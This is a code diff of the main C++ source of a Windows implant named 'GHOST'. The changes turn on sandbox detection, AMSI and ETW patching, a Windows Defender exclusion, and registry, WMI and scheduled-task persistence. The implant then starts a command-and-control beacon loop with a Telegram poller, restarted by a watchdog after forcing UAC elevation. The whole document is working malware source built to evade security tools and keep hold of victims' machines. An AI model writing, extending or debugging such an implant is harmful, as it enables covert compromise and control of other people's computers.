@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <algorithm>
-#include <shellapi.h>          // for ShellExecuteExW
+#include <shellapi.h>
 #include "syscalls.hpp"
 #include "evasion.hpp"
 #include "c2.hpp"
@@ -15,18 +15,13 @@ static void NtSleep(DWORD ms) {
     static NtDelayExecution_t pfn = nullptr;
     if (!pfn) {
         HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
-        if (h) {
-            pfn = reinterpret_cast<NtDelayExecution_t>(
-                HashProc(h, FNV("NtDelayExecution")));
-        }
+        if (h) pfn = reinterpret_cast<NtDelayExecution_t>(HashProc(h, FNV("NtDelayExecution")));
     }
     if (pfn) {
         LARGE_INTEGER li;
         li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
         pfn(FALSE, &li);
-    } else {
-        Sleep(ms);
-    }
+    } else Sleep(ms);
 }
 
 static void DecoyLoop() {
@@ -34,35 +29,20 @@ static void DecoyLoop() {
     for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
 }
 
-// ──────────────────────────────────────────────────────────────
-//  ADMIN ELEVATION — force UAC prompt if not already admin
-// ──────────────────────────────────────────────────────────────
+// ─── Admin elevation ──────────────────────────────────────────────────────────
 static BOOL EnsureElevated() {
     if (IsElevated()) return TRUE;
-
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
-
     SHELLEXECUTEINFOW sei = {};
     sei.cbSize = sizeof(sei);
     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-    sei.lpVerb = L"runas";               // triggers UAC prompt
+    sei.lpVerb = L"runas";
     sei.lpFile = exePath;
-    sei.lpParameters = L"--elevated";    // optional flag to avoid re‑relaunch
+    sei.lpParameters = L"--elevated";
     sei.nShow = SW_HIDE;
-
-    if (ShellExecuteExW(&sei)) {
-        // Wait a moment for the new process to start, then exit current
-        Sleep(1000);
-        return FALSE;   // tell caller to exit
-    }
-
-    // If elevation fails, show a message and exit
-    MessageBoxW(NULL,
-        L"GHOST requires administrator privileges to run.\n\n"
-        L"Please run as Administrator.",
-        L"Elevation Required",
-        MB_ICONERROR | MB_OK);
+    if (ShellExecuteExW(&sei)) { Sleep(1000); return FALSE; }
+    MessageBoxW(NULL, L"GHOST requires administrator privileges.", L"Elevation Required", MB_ICONERROR | MB_OK);
     return FALSE;
 }
 
@@ -70,145 +50,108 @@ DWORD WINAPI ImplantThread(LPVOID) {
     printf("[DEBUG] ImplantThread started\n");
     fflush(stdout);
 
+    // ─── Sandbox detection → deep sleep ────────────────────────────────────
+    if (SandboxCheck()) {
+        printf("[DEBUG] Sandbox detected – entering deep sleep (1–4 hours).\n");
+        fflush(stdout);
+        // DeepSleep is called inside ReapplyEvasion, but we do it here explicitly
+        DeepSleep();
+        return 0; // after deep sleep, exit (watchdog will restart)
+    }
+
     DecoyLoop();
     printf("[DEBUG] DecoyLoop done\n");
     fflush(stdout);
 
-    // ──────────────────────────────────────────────────────────────
-    //  DISABLE SANDBOX CHECK FOR TESTING
-    // ──────────────────────────────────────────────────────────────
-    printf("[DEBUG] SandboxCheck disabled for testing.\n");
-    fflush(stdout);
-    /*
-    if (SandboxCheck()) {
-        printf("[DEBUG] SandboxCheck returned TRUE – sleeping 10 minutes\n");
-        fflush(stdout);
-        NtSleep(600000);
-        return 0;
-    }
-    */
-
+    // ─── Syscalls ──────────────────────────────────────────────────────────
     printf("[DEBUG] Initializing syscalls...\n");
     fflush(stdout);
-    int syscallAttempts = 0;
     while (!InitializeSyscalls()) {
-        printf("[DEBUG] InitializeSyscalls failed (attempt %d) – retrying in 5s\n", ++syscallAttempts);
+        printf("[DEBUG] InitializeSyscalls failed – retrying in 5s\n");
         fflush(stdout);
         NtSleep(5000);
     }
-    printf("[DEBUG] InitializeSyscalls succeeded\n");
+    printf("[DEBUG] Syscalls initialized\n");
     fflush(stdout);
 
-    printf("[DEBUG] Patching AMSI...\n");
+    // ─── Evasion ────────────────────────────────────────────────────────────
+    printf("[DEBUG] Patching AMSI/ETW/HW-BP...\n");
     fflush(stdout);
     PatchAMSI();
-    printf("[DEBUG] Patching ETW...\n");
-    fflush(stdout);
     PatchETW();
-    printf("[DEBUG] Clearing hardware breakpoints...\n");
-    fflush(stdout);
     ClearHardwareBreakpoints();
     printf("[DEBUG] Evasion applied\n");
     fflush(stdout);
 
+    // ─── Defender exclusion (registry) ─────────────────────────────────────
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
-    printf("[DEBUG] Exe path: %S\n", exePath);
+    if (IsElevated()) {
+        printf("[DEBUG] Adding Defender exclusion (registry)\n");
+        fflush(stdout);
+        AddDefenderExclusion(exePath);
+    }
+
+    // ─── Persistence (all layers) ──────────────────────────────────────────
+    printf("[DEBUG] Installing persistence...\n");
+    fflush(stdout);
+    InstallRegistryPersistence(exePath);
+    if (!IsWmiPersistenceInstalled()) {
+        InstallWmiPersistence(exePath);
+        InstallWmiScriptPersistence(exePath);
+    }
+    if (!IsScheduledTaskInstalled()) {
+        InstallScheduledTaskPersistence(exePath);
+    }
+    printf("[DEBUG] Persistence installed\n");
     fflush(stdout);
 
-    // ─── Defender exclusion removed – too noisy ───
-    // if (IsElevated()) {
-    //     printf("[DEBUG] Running elevated – adding Defender exclusion\n");
-    //     fflush(stdout);
-    //     AddDefenderExclusion(exePath);
-    // }
-
-    // ──────────────────────────────────────────────────────────────
-    //  SKIP PERSISTENCE – test C2 core
-    // ──────────────────────────────────────────────────────────────
-    printf("[DEBUG] Skipping persistence installation for testing.\n");
-    fflush(stdout);
-
+    // ─── Start C2 beacon loop (and Telegram poller inside) ──────────────
     printf("[DEBUG] Entering BeaconLoop...\n");
     fflush(stdout);
     BeaconLoop();
 
-    // BeaconLoop only returns on a clean operator 'exit' command.
-    // Exit code 0 signals the watchdog to stop restarting.
     printf("[DEBUG] BeaconLoop returned (clean exit)\n");
     fflush(stdout);
-    return 0;  // watchdog sees 0 → stop
+    return 0;
 }
 
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     printf("[DEBUG] WinMain entered\n");
     fflush(stdout);
 
-    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
-
-    // ─── Elevate if not already admin ──────────────────────────────
-    // Check if we already have the "--elevated" flag to avoid re‑elevating
+    // Elevate if not already admin
     if (strstr(lpCmdLine, "--elevated") == nullptr) {
         if (!EnsureElevated()) {
-            printf("[DEBUG] Elevation requested – exiting current process.\n");
+            printf("[DEBUG] Elevation requested – exiting.\n");
             fflush(stdout);
             return 0;
         }
     }
-    printf("[DEBUG] Running with administrator privileges.\n");
-    fflush(stdout);
+    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
     if (!hKernel32) return 0;
-
-    auto _CreateThread        = HASHPROC(hKernel32, CreateThread);
+    auto _CreateThread = HASHPROC(hKernel32, CreateThread);
     auto _WaitForSingleObject = HASHPROC(hKernel32, WaitForSingleObject);
-    auto _CloseHandle         = HASHPROC(hKernel32, CloseHandle);
-    auto _GetExitCodeThread   = HASHPROC(hKernel32, GetExitCodeThread);
-    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
-        return 0;
-    }
+    auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
+    auto _GetExitCodeThread = HASHPROC(hKernel32, GetExitCodeThread);
+    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) return 0;
 
-    // ── WATCHDOG RESTART LOOP ─────────────────────────────────────────────
+    // Watchdog loop
     DWORD restartCount = 0;
-
     while (true) {
         if (restartCount > 0) {
             DWORD backoffMs = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
-            printf("[DEBUG] Watchdog: restarting ImplantThread in %lus (restart #%lu)\n",
-                   backoffMs / 1000, restartCount);
-            fflush(stdout);
             Sleep(backoffMs);
         }
-
-        printf("[DEBUG] Watchdog: spawning ImplantThread (restart #%lu)\n", restartCount);
-        fflush(stdout);
-
         HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
-        if (!hThread) {
-            printf("[DEBUG] Watchdog: CreateThread failed — retrying in 5s\n");
-            fflush(stdout);
-            Sleep(5000);
-            ++restartCount;
-            continue;
-        }
-
+        if (!hThread) { Sleep(5000); ++restartCount; continue; }
         _WaitForSingleObject(hThread, INFINITE);
-
         DWORD exitCode = 0;
         _GetExitCodeThread(hThread, &exitCode);
         _CloseHandle(hThread);
-
-        printf("[DEBUG] Watchdog: ImplantThread exited (code=%lu)\n", exitCode);
-        fflush(stdout);
-
-        // Exit code 0 == clean operator 'exit' — respect it
-        if (exitCode == 0) {
-            printf("[DEBUG] Watchdog: clean exit received — terminating\n");
-            fflush(stdout);
-            return 0;
-        }
-
+        if (exitCode == 0) { printf("[DEBUG] Clean exit – terminating.\n"); fflush(stdout); return 0; }
         ++restartCount;
     }
 }
